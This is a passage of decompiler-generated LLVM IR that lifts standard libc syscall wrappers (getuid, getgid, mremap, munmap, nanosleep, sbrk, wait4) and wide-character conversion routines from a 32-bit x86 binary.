  %v2_8051f07 = inttoptr i32 %v1_8051f00 to i32*
  store i32 %v1_8051f05, i32* %v2_8051f07, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051f0c

dec_label_pc_8051f0c:                             ; preds = %entry, %dec_label_pc_8051f00
  %v0_8051f0d = phi i32 [ %v9_8051ef4, %entry ], [ -1, %dec_label_pc_8051f00 ]
  %v2_8051f10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f10, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051f0d

; uselistorder directives
  uselistorder i32 %v9_8051ef4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f0c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f14 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f14, i32* %stack_var_-4, align 4
  %v1_8051f1d = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051f1d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f1d, -4095
  br i1 %tmp, label %dec_label_pc_8051f34, label %dec_label_pc_8051f28

dec_label_pc_8051f28:                             ; preds = %entry
  %v0_8051f28 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f28 = call i32 @__errno_location(i32 %v0_8051f28)
  %v0_8051f2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f2d = sub i32 0, %v0_8051f2d
  %v2_8051f2f = inttoptr i32 %v1_8051f28 to i32*
  store i32 %v1_8051f2d, i32* %v2_8051f2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f34

dec_label_pc_8051f34:                             ; preds = %entry, %dec_label_pc_8051f28
  %v0_8051f35 = phi i32 [ %v1_8051f1d, %entry ], [ -1, %dec_label_pc_8051f28 ]
  %v2_8051f38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f38, i32* @ebx, align 4
  ret i32 %v0_8051f35

; uselistorder directives
  uselistorder i32 %v1_8051f1d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f34, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f3c = load i32, i32* @ebx, align 4
  store i32 %v0_8051f3c, i32* %stack_var_-4, align 4
  %v1_8051f45 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051f45, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f45, -4095
  br i1 %tmp, label %dec_label_pc_8051f5c, label %dec_label_pc_8051f50

dec_label_pc_8051f50:                             ; preds = %entry
  %v0_8051f50 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f50 = call i32 @__errno_location(i32 %v0_8051f50)
  %v0_8051f55 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f55 = sub i32 0, %v0_8051f55
  %v2_8051f57 = inttoptr i32 %v1_8051f50 to i32*
  store i32 %v1_8051f55, i32* %v2_8051f57, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f5c

dec_label_pc_8051f5c:                             ; preds = %entry, %dec_label_pc_8051f50
  %v0_8051f5d = phi i32 [ %v1_8051f45, %entry ], [ -1, %dec_label_pc_8051f50 ]
  %v2_8051f60 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f60, i32* @ebx, align 4
  ret i32 %v0_8051f5d

; uselistorder directives
  uselistorder i32 %v1_8051f45, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f5c, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f64 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f64, i32* %stack_var_-4, align 4
  %v1_8051f6d = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051f6d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f6d, -4095
  br i1 %tmp, label %dec_label_pc_8051f84, label %dec_label_pc_8051f78

dec_label_pc_8051f78:                             ; preds = %entry
  %v0_8051f78 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f78 = call i32 @__errno_location(i32 %v0_8051f78)
  %v0_8051f7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f7d = sub i32 0, %v0_8051f7d
  %v2_8051f7f = inttoptr i32 %v1_8051f78 to i32*
  store i32 %v1_8051f7d, i32* %v2_8051f7f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f84

dec_label_pc_8051f84:                             ; preds = %entry, %dec_label_pc_8051f78
  %v0_8051f85 = phi i32 [ %v1_8051f6d, %entry ], [ -1, %dec_label_pc_8051f78 ]
  %v2_8051f88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f88, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051f85

; uselistorder directives
  uselistorder i32 %v1_8051f6d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051f84, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f8c = load i32, i32* @ebx, align 4
  store i32 %v0_8051f8c, i32* %stack_var_-4, align 4
  %v1_8051f95 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051f95, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f95, -4095
  br i1 %tmp, label %dec_label_pc_8051fac, label %dec_label_pc_8051fa0

dec_label_pc_8051fa0:                             ; preds = %entry
  %v0_8051fa0 = load i32, i32* %stack_var_-4, align 4
  %v1_8051fa0 = call i32 @__errno_location(i32 %v0_8051fa0)
  %v0_8051fa5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fa5 = sub i32 0, %v0_8051fa5
  %v2_8051fa7 = inttoptr i32 %v1_8051fa0 to i32*
  store i32 %v1_8051fa5, i32* %v2_8051fa7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fac

dec_label_pc_8051fac:                             ; preds = %entry, %dec_label_pc_8051fa0
  %v0_8051fad = phi i32 [ %v1_8051f95, %entry ], [ -1, %dec_label_pc_8051fa0 ]
  %v2_8051fb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fb0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051fad

; uselistorder directives
  uselistorder i32 %v1_8051f95, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051fac, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051fb4 = load i32, i32* @edi, align 4
  %v0_8051fb5 = load i32, i32* @esi, align 4
  store i32 %v0_8051fb5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8051fcd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8051fd5 = call i32 @mremap(i32 %v0_8051fcd, i32 %v0_8051fb5, i32 %v0_8051fb4, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8051fcd, i32* @ebx, align 4
  store i32 %v6_8051fd5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8051fd5, -4095
  br i1 %tmp, label %dec_label_pc_8051fed, label %dec_label_pc_8051fe1

dec_label_pc_8051fe1:                             ; preds = %entry
  %v1_8051fe1 = call i32 @__errno_location(i32 %v0_8051fcd)
  %v0_8051fe6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051fe6 = sub i32 0, %v0_8051fe6
  %v2_8051fe8 = inttoptr i32 %v1_8051fe1 to i32*
  store i32 %v1_8051fe6, i32* %v2_8051fe8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051fed

dec_label_pc_8051fed:                             ; preds = %entry, %dec_label_pc_8051fe1
  %v0_8051fee = phi i32 [ %v6_8051fd5, %entry ], [ -1, %dec_label_pc_8051fe1 ]
  %v2_8051fed = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051fed, i32* @edx, align 4
  %v2_8051ff0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051ff0, i32* @esi, align 4
  store i32 %v0_8051fb4, i32* @edi, align 4
  ret i32 %v0_8051fee

; uselistorder directives
  uselistorder i32 %v6_8051fd5, { 1, 0, 2 }
  uselistorder i32 %v0_8051fcd, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fed, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ff4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ff4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8052007 = call i32 @munmap(i32 %v0_8051ff4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8052007, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052007, -4095
  br i1 %tmp, label %dec_label_pc_8052020, label %dec_label_pc_8052014

dec_label_pc_8052014:                             ; preds = %entry
  %v0_8052014 = load i32, i32* %stack_var_-4, align 4
  %v1_8052014 = call i32 @__errno_location(i32 %v0_8052014)
  %v0_8052019 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052019 = sub i32 0, %v0_8052019
  %v2_805201b = inttoptr i32 %v1_8052014 to i32*
  store i32 %v1_8052019, i32* %v2_805201b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052020

dec_label_pc_8052020:                             ; preds = %entry, %dec_label_pc_8052014
  %v0_8052021 = phi i32 [ %v4_8052007, %entry ], [ -1, %dec_label_pc_8052014 ]
  %v2_8052020 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052020, i32* @edx, align 4
  %v2_8052024 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052024, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052021

; uselistorder directives
  uselistorder i32 %v4_8052007, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052020, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8052028 = load i32, i32* @ebx, align 4
  store i32 %v0_8052028, i32* %stack_var_-4, align 4
  %v4_805202c = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_805202c, i32* %ebx.global-to-local, align 4
  %v6_805203b = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_805203b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_805203b, -4095
  br i1 %tmp, label %dec_label_pc_8052054, label %dec_label_pc_8052048

dec_label_pc_8052048:                             ; preds = %entry
  %v0_8052048 = load i32, i32* %stack_var_-4, align 4
  %v1_8052048 = call i32 @__errno_location(i32 %v0_8052048)
  %v0_805204d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805204d = sub i32 0, %v0_805204d
  %v2_805204f = inttoptr i32 %v1_8052048 to i32*
  store i32 %v1_805204d, i32* %v2_805204f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052054

dec_label_pc_8052054:                             ; preds = %entry, %dec_label_pc_8052048
  %v0_8052055 = phi i32 [ %v6_805203b, %entry ], [ -1, %dec_label_pc_8052048 ]
  %v2_8052058 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052058, i32* @ebx, align 4
  ret i32 %v0_8052055

; uselistorder directives
  uselistorder i32 %v6_805203b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052054, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805205d = load i32, i32* @ebx, align 4
  %v0_8052061 = load i32, i32* @global_var_8060964.231, align 4
  %v1_8052061 = icmp eq i32 %v0_8052061, 0
  %v1_805206c = icmp eq i1 %v1_8052061, false
  br i1 %v1_805206c, label %dec_label_pc_805207f, label %dec_label_pc_805206e

dec_label_pc_805206e:                             ; preds = %entry
  %v1_8052073 = call i32 @__GI_brk(i32 0)
  %v2_805207b = icmp slt i32 %v1_8052073, 0
  br i1 %v2_805207b, label %dec_label_pc_80520a1, label %dec_label_pc_805206e.dec_label_pc_805207f_crit_edge

dec_label_pc_805206e.dec_label_pc_805207f_crit_edge: ; preds = %dec_label_pc_805206e
  %v0_8052081.pre = load i32, i32* @global_var_8060964.231, align 4
  br label %dec_label_pc_805207f

dec_label_pc_805207f:                             ; preds = %dec_label_pc_805206e.dec_label_pc_805207f_crit_edge, %entry
  %v0_805208f = phi i32 [ %v0_8052081.pre, %dec_label_pc_805206e.dec_label_pc_805207f_crit_edge ], [ %v0_8052061, %entry ]
  %v1_805207f = icmp eq i32 %arg1, 0
  %v1_8052086 = icmp eq i1 %v1_805207f, false
  br i1 %v1_8052086, label %dec_label_pc_805208c, label %dec_label_pc_8052088

dec_label_pc_8052088:                             ; preds = %dec_label_pc_805207f
  br label %dec_label_pc_80520a4

dec_label_pc_805208c:                             ; preds = %dec_label_pc_805207f
  store i32 %v0_805208f, i32* @ebx, align 4
  %v2_8052091 = add i32 %v0_805208f, %arg1
  %v1_8052095 = call i32 @__GI_brk(i32 %v2_8052091)
  %v2_805209d = icmp slt i32 %v1_8052095, 0
  %v1_805209f = icmp eq i1 %v2_805209d, false
  br i1 %v1_805209f, label %dec_label_pc_805208c.dec_label_pc_80520a4_crit_edge, label %dec_label_pc_80520a1

dec_label_pc_805208c.dec_label_pc_80520a4_crit_edge: ; preds = %dec_label_pc_805208c
  %v0_80520a5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80520a4

dec_label_pc_80520a1:                             ; preds = %dec_label_pc_805208c, %dec_label_pc_805206e
  br label %dec_label_pc_80520a4

dec_label_pc_80520a4:                             ; preds = %dec_label_pc_805208c.dec_label_pc_80520a4_crit_edge, %dec_label_pc_8052088, %dec_label_pc_80520a1
  %v0_80520a5 = phi i32 [ %v0_80520a5.pre, %dec_label_pc_805208c.dec_label_pc_80520a4_crit_edge ], [ %v0_805208f, %dec_label_pc_8052088 ], [ -1, %dec_label_pc_80520a1 ]
  %v2_80520a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80520a4, i32* @edx, align 4
  store i32 %v0_805205d, i32* @ebx, align 4
  ret i32 %v0_80520a5

; uselistorder directives
  uselistorder i32 %v0_805208f, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_80520a4, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80520ac = load i32, i32* @edi, align 4
  %v0_80520ad = load i32, i32* @esi, align 4
  store i32 %v0_80520ad, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_80520c1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80520c9 = call i32 @wait4(i32 %v0_80520c1, i32 %v0_80520ad, i32 %v0_80520ac, i32 %tmp5)
  store i32 %v0_80520c1, i32* @ebx, align 4
  store i32 %v4_80520c9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80520c9, -4095
  br i1 %tmp, label %dec_label_pc_80520e1, label %dec_label_pc_80520d5

dec_label_pc_80520d5:                             ; preds = %entry
  %v1_80520d5 = call i32 @__errno_location(i32 %v0_80520c1)
  %v0_80520da = load i32, i32* %esi.global-to-local, align 4
  %v1_80520da = sub i32 0, %v0_80520da
  %v2_80520dc = inttoptr i32 %v1_80520d5 to i32*
  store i32 %v1_80520da, i32* %v2_80520dc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80520e1

dec_label_pc_80520e1:                             ; preds = %entry, %dec_label_pc_80520d5
  %v0_80520e2 = phi i32 [ %v4_80520c9, %entry ], [ -1, %dec_label_pc_80520d5 ]
  %v2_80520e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80520e4, i32* @esi, align 4
  store i32 %v0_80520ac, i32* @edi, align 4
  ret i32 %v0_80520e2

; uselistorder directives
  uselistorder i32 %v4_80520c9, { 1, 0, 2 }
  uselistorder i32 %v0_80520c1, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_80520e1, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8060944.232 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_80520fb = icmp eq i32 %tmp4, 0
  %v1_80520fd = icmp eq i1 %v1_80520fb, false
  br i1 %v1_80520fd, label %dec_label_pc_8052105, label %dec_label_pc_80520ff

dec_label_pc_80520ff:                             ; preds = %entry
  %v2_80520ff = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8052105

dec_label_pc_8052105:                             ; preds = %entry, %dec_label_pc_80520ff
  %v0_8052121 = phi i32 [ %tmp4, %entry ], [ %v2_80520ff, %dec_label_pc_80520ff ]
  %v0_805210d = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_80520ff ]
  %v2_8052105 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8052105, i32* %stack_var_-8, align 4
  store i32 %v0_805210d, i32* %stack_var_-4, align 4
  %v2_805211c = ptrtoint i32* %stack_var_-8 to i32
  %v5_8052122 = inttoptr i32 %v0_8052121 to i8*
  %v6_8052122 = call i32 @__GI_wcsnrtombs(i8* %v5_8052122, i32 %v2_805211c, i32 1, i32 16, i32 %tmp)
  %v1_805212c = icmp eq i32 %v6_8052122, 0
  %v3_805212e = select i1 %v1_805212c, i32 1, i32 %v6_8052122
  ret i32 %v3_805212e

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8052105, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_805214d = inttoptr i32 %tmp to i8*
  %v6_805214d = call i32 @__GI_wcsnrtombs(i8* %v5_805214d, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_805214d
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_805215b = load i32, i32* @ebx, align 4
  %v4_805215f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805215f, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_805216f = icmp eq i8* %arg1, null
  store i1 %v1_805216f, i1* %zf.global-to-local, align 1
  br i1 %v1_805216f, label %dec_label_pc_805217e, label %dec_label_pc_8052173

dec_label_pc_8052173:                             ; preds = %entry
  %v12_8052173 = icmp eq i32 %v4_805215f, %arg2
  store i1 %v12_8052173, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805217a = icmp eq i1 %v12_8052173, false
  br i1 %v1_805217a, label %dec_label_pc_80521a1, label %dec_label_pc_805219b

dec_label_pc_805217e:                             ; preds = %entry
  %v2_805217e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805217e, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805219f

dec_label_pc_8052187:                             ; preds = %dec_label_pc_80521af
  %v1_8052187 = call i32 @__errno_location(i32 %v0_805215b)
  %v1_805218c = inttoptr i32 %v1_8052187 to i32*
  store i32 84, i32* %v1_805218c, align 4
  br label %dec_label_pc_80521d5

dec_label_pc_8052197:                             ; preds = %dec_label_pc_80521b6
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80521ca.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80521c6

dec_label_pc_805219b:                             ; preds = %dec_label_pc_8052173
  %v2_805219b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805219b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805219f

dec_label_pc_805219f:                             ; preds = %dec_label_pc_805217e, %dec_label_pc_805219b
  %v2_80521b816 = phi i32 [ %v2_805217e, %dec_label_pc_805217e ], [ %v2_805219b, %dec_label_pc_805219b ]
  %v1_80521a412 = phi i32 [ -1, %dec_label_pc_805217e ], [ %arg4, %dec_label_pc_805219b ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80521a1

dec_label_pc_80521a1:                             ; preds = %dec_label_pc_8052173, %dec_label_pc_805219f
  %v2_80521b815 = phi i32 [ %v4_805215f, %dec_label_pc_8052173 ], [ %v2_80521b816, %dec_label_pc_805219f ]
  %v0_80521a6 = phi i32 [ %arg4, %dec_label_pc_8052173 ], [ %v1_80521a412, %dec_label_pc_805219f ]
  %v1_80521a1 = inttoptr i32 %arg2 to i32*
  %v2_80521a1 = load i32, i32* %v1_80521a1, align 4
  store i32 %v2_80521a1, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_80521a6, %arg3
  %v5_80521a8 = select i1 %tmp31, i32 %arg3, i32 %v0_80521a6
  store i32 %v5_80521a8, i32* %edi.global-to-local, align 4
  store i32 %v5_80521a8, i32* @ecx, align 4
  %v1_80521c23 = icmp eq i32 %v5_80521a8, 0
  store i1 %v1_80521c23, i1* %zf.global-to-local, align 1
  %v1_80521c410 = icmp eq i1 %v1_80521c23, false
  br i1 %v1_80521c410, label %dec_label_pc_80521af, label %dec_label_pc_80521c6

dec_label_pc_80521af:                             ; preds = %dec_label_pc_80521a1, %dec_label_pc_80521bc
  %v2_80521b8 = phi i32 [ %v2_80521bf, %dec_label_pc_80521bc ], [ %v2_80521b815, %dec_label_pc_80521a1 ]
  %v0_80521af = phi i32 [ %v1_80521bc, %dec_label_pc_80521bc ], [ %v2_80521a1, %dec_label_pc_80521a1 ]
  %v1_80521af = inttoptr i32 %v0_80521af to i32*
  %v2_80521af = load i32, i32* %v1_80521af, align 4
  %v9_80521b1 = icmp eq i32 %v2_80521af, 127
  store i1 %v9_80521b1, i1* %zf.global-to-local, align 1
  %v6_80521b4 = icmp ugt i32 %v2_80521af, 127
  br i1 %v6_80521b4, label %dec_label_pc_8052187, label %dec_label_pc_80521b6

dec_label_pc_80521b6:                             ; preds = %dec_label_pc_80521af
  %v3_80521b6 = trunc i32 %v2_80521af to i8
  %v4_80521b6 = icmp eq i8 %v3_80521b6, 0
  store i1 %v4_80521b6, i1* %zf.global-to-local, align 1
  %v3_80521b8 = inttoptr i32 %v2_80521b8 to i8*
  store i8 %v3_80521b6, i8* %v3_80521b8, align 1
  %v0_80521ba = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80521ba, label %dec_label_pc_8052197, label %dec_label_pc_80521bc

dec_label_pc_80521bc:                             ; preds = %dec_label_pc_80521b6
  %v0_80521bc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521bc = add i32 %v0_80521bc, 4
  store i32 %v1_80521bc, i32* %ebx.global-to-local, align 4
  %v0_80521bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80521bf = load i32, i32* %esi.global-to-local, align 4
  %v2_80521bf = add i32 %v1_80521bf, %v0_80521bf
  store i32 %v2_80521bf, i32* %edx.global-to-local, align 4
  %v0_80521c1 = load i32, i32* @ecx, align 4
  %v1_80521c1 = add i32 %v0_80521c1, -1
  %v8_80521c1 = icmp eq i32 %v1_80521c1, 0
  store i32 %v1_80521c1, i32* @ecx, align 4
  store i1 %v8_80521c1, i1* %zf.global-to-local, align 1
  %v1_80521c4 = icmp eq i1 %v8_80521c1, false
  br i1 %v1_80521c4, label %dec_label_pc_80521af, label %dec_label_pc_80521c6

dec_label_pc_80521c6:                             ; preds = %dec_label_pc_80521bc, %dec_label_pc_80521a1, %dec_label_pc_8052197
  %v0_80521ce = phi i32 [ 0, %dec_label_pc_8052197 ], [ %v2_80521a1, %dec_label_pc_80521a1 ], [ %v1_80521bc, %dec_label_pc_80521bc ]
  %v0_80521ca = phi i32 [ %v0_80521ca.pre, %dec_label_pc_8052197 ], [ %v2_80521b815, %dec_label_pc_80521a1 ], [ %v2_80521bf, %dec_label_pc_80521bc ]
  %v2_80521c6 = ptrtoint i32* %stack_var_-32 to i32
  %v12_80521ca = icmp eq i32 %v0_80521ca, %v2_80521c6
  store i1 %v12_80521ca, i1* %zf.global-to-local, align 1
  br i1 %v12_80521ca, label %dec_label_pc_80521d1, label %dec_label_pc_80521ce

dec_label_pc_80521ce:                             ; preds = %dec_label_pc_80521c6
  %v1_80521ce = load i32, i32* %ebp.global-to-local, align 4
  %v2_80521ce = inttoptr i32 %v1_80521ce to i32*
  store i32 %v0_80521ce, i32* %v2_80521ce, align 4
  br label %dec_label_pc_80521d1

dec_label_pc_80521d1:                             ; preds = %dec_label_pc_80521c6, %dec_label_pc_80521ce
  %v0_80521d1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80521d3 = load i32, i32* @ecx, align 4
  %v2_80521d3 = sub i32 %v0_80521d1, %v1_80521d3
  %v12_80521d3 = icmp eq i32 %v2_80521d3, 0
  br label %dec_label_pc_80521d5

dec_label_pc_80521d5:                             ; preds = %dec_label_pc_8052187, %dec_label_pc_80521d1
  %storemerge = phi i1 [ %v12_80521d3, %dec_label_pc_80521d1 ], [ false, %dec_label_pc_8052187 ]
  %storemerge1 = phi i32 [ %v2_80521d3, %dec_label_pc_80521d1 ], [ -1, %dec_label_pc_8052187 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_80521d5 = load i32, i32* @esp, align 4
  %v9_80521d5 = icmp eq i32 %v0_80521d5, -28
  store i1 %v9_80521d5, i1* %zf.global-to-local, align 1
  store i32 %v0_805215b, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_80521ca, { 1, 0 }
  uselistorder i32 %v2_80521bf, { 0, 2, 1 }
  uselistorder i32 %v1_80521bc, { 0, 2, 1 }
  uselistorder i32 %v2_80521af, { 1, 2, 0 }
  uselistorder i32 %v2_80521a1, { 1, 0, 2 }
  uselistorder i32 %v0_80521a6, { 1, 0 }
  uselistorder i32 %v2_80521b815, { 1, 0 }
  uselistorder i1 %v12_8052173, { 1, 0 }
  uselistorder i32 %v4_805215f, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 11, 1, 6, 3, 4, 5, 12, 7, 2, 8, 9, 10 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 5, 3, 6, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521d5, { 1, 0 }
  uselistorder label %dec_label_pc_80521d1, { 1, 0 }
  uselistorder label %dec_label_pc_80521af, { 1, 0 }
  uselistorder label %dec_label_pc_80521a1, { 1, 0 }
  uselistorder label %dec_label_pc_805219f, { 1, 0 }
}

